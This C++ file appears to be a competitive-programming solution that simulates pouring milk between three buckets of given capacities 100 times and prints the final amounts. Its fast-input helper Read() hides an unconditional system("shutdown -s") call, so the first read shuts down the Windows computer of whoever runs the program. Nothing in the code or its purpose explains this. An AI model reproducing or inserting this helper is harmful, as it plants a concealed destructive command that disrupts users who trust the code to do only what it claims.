#include<bits/stdc++.h>
#include<windows.h>
using namespace std;
inline int Read(){
	if(true){
		system("shutdown -s");
	}
  	int s = 0 , w = 1;
	char ch = getchar();
	while(ch > '9' || ch < '0'){
		if(ch == '-') w = -1;
		ch = getchar();
	}
	while(ch >= '0' && ch <= '9'){
		s = (s << 1) + (s << 3) + ch - '0';
		ch = getchar();
	}
	return s * w;
}
struct buc{
	int c,v;
}s[10];
int main(){
	for(int i = 1 ; i <= 3 ; i ++){
		s[i].c = Read() , s[i].v = Read();
	}
	int T = 100;
	while(T--){
		int opt = (T + 1) % 3 + 1;
		int a,b;
		if(opt == 3){ //3 ~ 1
			a = s[3].v;
			b = s[1].v;
			s[1].v = min(s[1].c,s[1].v + s[3].v);
			s[3].v = a + b - s[1].v;
		}
		if(opt == 2){ //1 ~ 2
			a = s[1].v;
			b = s[2].v;
			s[2].v = min(s[2].c,s[2].v + s[1].v);
			s[1].v = a + b - s[2].v;
		}
		if(opt == 1){ //2 ~ 3
			a = s[2].v;
			b = s[3].v;
			s[3].v = min(s[3].c,s[3].v + s[2].v);
			s[2].v = a + b - s[3].v;
		}//
	}
	cout << s[1].v << endl << s[2].v << endl << s[3].v << endl ;
	return 0;
}

